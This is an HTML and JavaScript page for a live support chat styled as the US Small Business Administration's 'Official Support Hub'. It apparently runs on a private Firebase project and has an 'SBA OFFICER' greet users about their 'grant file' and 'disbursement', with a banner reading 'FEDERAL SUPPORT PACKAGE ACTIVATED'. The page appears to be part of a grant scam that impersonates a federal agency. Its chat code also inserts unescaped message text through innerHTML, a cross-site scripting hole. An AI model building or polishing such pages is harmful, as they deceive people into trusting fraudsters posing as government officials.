<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA | Official Support Hub</title>
    <style>
        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --bg: #f1f5f9; }
        
        body { 
            background: var(--bg); margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; 
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }

        .chat-box {
            width: 100%; max-width: 450px; height: 95vh; background: #ffffff;
            border-radius: 15px; display: flex; flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden;
        }

        .chat-header { 
            background: var(--sba-blue); color: white; padding: 15px; 
            display: flex; justify-content: space-between; align-items: center; 
            border-bottom: 3px solid var(--sba-red);
        }

        #messageDisplay { 
            flex: 1; overflow-y: auto; padding: 15px; display: flex; 
            flex-direction: column; gap: 10px; background: #f8fafc;
        }

        .bubble { 
            max-width: 85%; padding: 10px 14px; border-radius: 15px; font-size: 13px; 
            line-height: 1.4; position: relative; word-wrap: break-word;
        }
        
        .user { align-self: flex-end; background: var(--sba-blue); color: white; border-bottom-right-radius: 2px; }
        .admin { align-self: flex-start; background: #e2e8f0; color: #1e293b; border-bottom-left-radius: 2px; border: 1px solid #cbd5e1; }

        .system-msg { 
            text-align: center; font-size: 10px; color: #64748b; 
            background: #fff; padding: 10px; border-radius: 8px; 
            margin-bottom: 10px; border: 1px dashed #cbd5e1;
        }

        .input-area { padding: 12px; background: white; border-top: 1px solid #eee; display: flex; gap: 8px; }
        input { flex: 1; padding: 10px 15px; border: 1px solid #ddd; border-radius: 20px; outline: none; font-size: 14px; }
        .send-btn { background: var(--sba-blue); color: white; border: none; padding: 0 15px; border-radius: 20px; cursor: pointer; font-weight: bold; }
        
        .exit-btn { background: var(--sba-red); border: none; color: white; padding: 5px 10px; border-radius: 5px; font-size: 10px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="chat-box">
        <div class="chat-header">
            <div>
                <div style="font-size: 14px; font-weight: bold;">SBA LIVE SUPPORT</div>
                <div style="font-size: 9px; opacity: 0.8;">OFFICER ONLINE • SECURE CHANNEL</div>
            </div>
            <button class="exit-btn" onclick="location.href='dashboard.html'">CLOSE</button>
        </div>

        <div id="messageDisplay">
            <p style="text-align:center; font-size:10px; color:#999;">Initializing secure encryption...</p>
        </div>

        <div class="input-area">
            <input type="text" id="userInput" placeholder="Type your message here..." autocomplete="off">
            <button id="sendBtn" class="send-btn">SEND</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, addDoc, query, where, onSnapshot, serverTimestamp, doc, getDoc, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
            projectId: "sba-portal-2026-f1253",
            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
            messagingSenderId: "363290267220",
            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        const display = document.getElementById('messageDisplay');
        const input = document.getElementById('userInput');
        let userName = "Applicant";

        onAuthStateChanged(auth, async (user) => {
            if (user) {
                // Get name for the greeting
                const uSnap = await getDoc(doc(db, "users", user.uid));
                if(uSnap.exists()) userName = uSnap.data().fullName || "Applicant";

                // Optimized Query: We listen for messages for THIS user
                const q = query(
                    collection(db, "support_tickets"), 
                    where("userId", "==", user.uid),
                    orderBy("timestamp", "asc")
                );

                onSnapshot(q, (snapshot) => {
                    // Clear and set Welcome Package
                    display.innerHTML = `
                        <div class="system-msg">
                            <b>FEDERAL SUPPORT PACKAGE ACTIVATED</b><br>
                            Case ID: SBA-${user.uid.substring(0,8).toUpperCase()}<br>
                            Status: Secure Connection Verified
                        </div>
                        <div class="bubble admin">
                            <b>SBA OFFICER:</b> Hello ${userName}. Welcome to the official support hub. 
                            Your grant file is currently open. How can I assist you with your disbursement or verification today?
                        </div>
                    `;
                    
                    snapshot.forEach(doc => {
                        const m = doc.data();
                        const div = document.createElement('div');
                        div.className = `bubble ${m.sender === 'ADMIN' ? 'admin' : 'user'}`;
                        
                        // Bold the sender for clarity
                        const senderTag = m.sender === 'ADMIN' ? '<b>OFFICER:</b> ' : '<b>YOU:</b> ';
                        div.innerHTML = senderTag + m.message;
                        
                        display.appendChild(div);
                    });
                    
                    // Force scroll to bottom
                    display.scrollTop = display.scrollHeight;
                }, (error) => {
                    // If index is missing, fallback to simple query
                    console.error("Index error, falling back...");
                    loadSimple(user.uid);
                });

            } else { window.location.href = 'index.html'; }
        });

        // Fallback function in case Firebase index isn't ready
        function loadSimple(uid) {
            const qBasic = query(collection(db, "support_tickets"), where("userId", "==", uid));
            onSnapshot(qBasic, (snap) => {
                display.innerHTML = `<div class="bubble admin">Connection Active. Please type your message.</div>`;
                snap.forEach(doc => {
                    const m = doc.data();
                    const div = document.createElement('div');
                    div.className = `bubble ${m.sender === 'ADMIN' ? 'admin' : 'user'}`;
                    div.innerHTML = m.message;
                    display.appendChild(div);
                });
            });
        }

        const sendMessage = async () => {
            const msg = input.value.trim();
            if(!msg || !auth.currentUser) return;
            
            const user = auth.currentUser;
            input.value = ""; 

            try {
                await addDoc(collection(db, "support_tickets"), {
                    userId: user.uid,
                    userName: userName,
                    message: msg,
                    sender: "USER",
                    timestamp: serverTimestamp()
                });
            } catch (err) { 
                alert("Message failed to send. Check connection.");
            }
        };

        document.getElementById('sendBtn').onclick = sendMessage;
        input.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(); };
    </script>
</body>
</html>
